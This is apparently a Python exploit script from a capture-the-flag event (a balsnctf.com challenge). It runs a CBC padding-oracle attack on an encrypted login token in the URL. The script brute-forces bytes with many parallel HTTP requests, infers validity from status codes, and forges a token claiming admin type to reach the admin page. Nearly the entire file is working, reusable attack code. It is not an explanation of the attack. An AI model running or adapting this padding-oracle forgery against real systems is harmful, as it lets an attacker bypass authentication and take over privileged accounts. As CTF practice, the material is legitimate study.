#!/usr/bin/env python3

import requests
import base64
import string
from joblib import Parallel, delayed
import multiprocessing

cores = multiprocessing.cpu_count()*32

url = 'http://old-but-gold.balsnctf.com/login/gXBStk4yoHkbieEBCHdLB601d9N7DbtQysvkDC_xn4_xSINrgWZIJA_BRR0bVCa9KFG99c173b8AD4fXQsNt8NgassroRWfRW6elhNdKKEE6D92jxIOlJRQ8bKumdxK1'
base  = url[:url.rfind('/')+1]
token = url[url.rfind('/')+1:]
raw_token = base64.urlsafe_b64decode(token+'='*(4 - len(token)%4))
b64_token = base64.urlsafe_b64encode(raw_token).decode()

def list_to_bytes(l):
    b = b''
    for c in l:
        b += c.to_bytes(1, 'big')
    return b

def xor_bytes(a, b):
    return bytes([x^y for x, y in zip(a, b)])

def pad(s):
    l = 16-(len(s)%16)
    return s + chr(l)*l


def guess_jj(i, j, v):
    if v.value == 1:
        return False
    fake_token = iv + \
                 xor_bytes(blocks_bytes[0], b'{'+b' '*(i-1)) + \
                 list_to_bytes([j]) + \
                 raw_token[17+i:-1] + \
                 list_to_bytes([last_byte^(79-i)])

    fake_url = base + base64.urlsafe_b64encode(fake_token).decode()
    assert len(fake_token) == len(raw_token)
    r = requests.get(fake_url)
    if r.status_code != 400:
        print(fake_url)
        print(i, j, r.status_code)
        v.value = 1
        return list_to_bytes([j^ord('}')])
    return False


target = '{"type":"admin","id":"aaaaaaaa-bbbb-cccc-dddd-ffffffffffff","mail":"admin"}'
padded_target = pad(target).encode()
block_num = (len(target)+16)//16

# oracle first block
# guess 2nd and after bytes
iv = raw_token[:16]
blocks_bytes = [b'' for x in range(block_num)]
blocks_bytes[0] += list_to_bytes([ord('{')^raw_token[16]])
last_byte = 0xb5^7
print(blocks_bytes)
for i in range(1, 16):
    v = multiprocessing.Value('i', 0)
    ret = Parallel(n_jobs=cores, backend='threading')(delayed(guess_jj)(i, j, v) for j in range(256))
    for r in ret:
        if r != False:
            blocks_bytes[0] += r
            break

#blocks_bytes = [b'\xd6\x17\x1e\xb7Y7\x99c\xaf\xf9\x86j\x17\xc5\xa6\xa2', b'', b'', b'', b'']
print(blocks_bytes)      

# oracle second and after blocks
def guess_j(i, j, v):
    if v.value == 1:
        return False
    fake_token = iv2 + \
                 list_to_bytes([i, j]) + b'a'*14 + \
                 iv + \
                 blocks_bytes[b-1][:-1] + list_to_bytes([last_byte^(46)])
    fake_url = base + base64.urlsafe_b64encode(fake_token).decode()
    assert len(fake_token) == 64
    r = requests.get(fake_url)
    if r.status_code != 400:
        print(fake_url)
        print(i, j, r.status_code)
        v.value = 1
        return list_to_bytes([i^ord('{'), j^ord('}')])
    return False

def guess_jjj(i, j, v):
    if v.value == 1:
        return False
    fake_token = iv2 + \
                 xor_bytes(blocks_bytes[b], b'{'+b' '*(i-1)) + list_to_bytes([j]) + b'a'*(15-i) + \
                 iv + \
                 blocks_bytes[b-1][:-1] + list_to_bytes([last_byte^(47-i)])
    fake_url = base + base64.urlsafe_b64encode(fake_token).decode()
    assert len(fake_token) == 64
    r = requests.get(fake_url)
    if r.status_code != 400:
        print(fake_url)
        print(i, j, r.status_code)
        v.value = 1
        return list_to_bytes([j^ord('}')])
    return False

'''
blocks_bytes = [
    b'\xd6\x17\x1e\xb7Y7\x99c\xaf\xf9\x86j\x17\xc5\xa6\xa2',
    b'\x9d\xa8\tJ\xc8\x16-\xdc\x1b\xf6"\xb1`\xd9\xc6I',
    b'\x82\xba\xb0\xa9\x03F90\xcc\x98\x88\n\xd3u\xb3C',
    b'\xe2\xf0\xb61\x0c\x01X^r\x96F\xf4\x9e\xfcPT',
    b's\xbc\x0f\x9e8\xa9\xefA<\x8bf\xa3\x8b\x94\xc1\xa4',
]
saved_i = [x^ord('{') for x in [157, 130, 226, 115]]
saved_j = [x^ord('}') for x in [168, 186, 240, 188]]
'''
saved_i = []
saved_j = []
begin = -1
for i in range(len(blocks_bytes)):
    if blocks_bytes[i] == b'':
        begin = i
        break
if begin == -1: begin = block_num
last_byte = blocks_bytes[0][-1]
for b in range(begin, block_num):
    # guess first 2 bytes
    found = 0
    print(padded_target[(b-1)*16:b*16].decode())
    iv2 = xor_bytes(blocks_bytes[b-1], padded_target[(b-1)*16:b*16])
    mflag = 0
    for i in saved_i + list(range(256)):
        if i % 10 == 0:
            print('doing', i)
        v = multiprocessing.Value('i', 0)
        ret = Parallel(n_jobs=cores, backend='threading')(delayed(guess_j)(i, j, v) for j in saved_j + list(range(256)))
        for r in ret:
            if r != False:
                blocks_bytes[b] += r
                mflag = 1
                break
        if mflag:
            break


    # guess 3rd and after bytes
    for i in range(2, 16):
        v = multiprocessing.Value('i', 0)
        ret = Parallel(n_jobs=cores, backend='threading')(delayed(guess_jjj)(i, j, v) for j in range(256))
        for r in ret:
            if r != False:
                blocks_bytes[b] += r
                break
    print('jizz', blocks_bytes)      

print(blocks_bytes)      

admin_token = iv + xor_bytes(b''.join(blocks_bytes), padded_target)
admin_url = base + base64.urlsafe_b64encode(admin_token).decode()
r = requests.get(admin_url)
print(admin_url)
print(r.text)

